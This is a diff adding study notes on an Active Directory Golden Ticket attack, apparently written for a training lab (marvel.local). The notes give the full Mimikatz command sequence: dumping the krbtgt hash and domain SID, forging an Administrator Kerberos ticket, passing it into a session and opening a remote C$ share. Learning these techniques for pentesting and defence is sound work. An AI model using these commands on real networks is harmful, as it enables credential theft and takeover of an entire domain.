@@ -29,3 +29,15 @@ We can request access to any resource or system on the domain
 Using Mimikatz in privilege debug
 privilege::debug 
 We can attack to get a Golden ticket giving us access to the whole domain
+
+## Golden Ticket Attacks
+
+mimikatz.exe
+privilege::debug
+lsadump::lsa /inject /name:krbtgt //copy domain SID and NTLM hash of primary krbtgt account
+kerberos::golden /User:Administrator /domain:marvel.local /sid:XXXXXXXX /krbtgt:NTLM_HASH /id:500 /ptt //Here does not have to be a real user, id 500 is reserved for admin accound id; ptt = pass the ticket to the next session
+//Ticket is valid for current session, so we start a cmd from that session
+misc::cmd
+
+And try to list remote machine from it:
+dir \\THEPUNISHER\c$
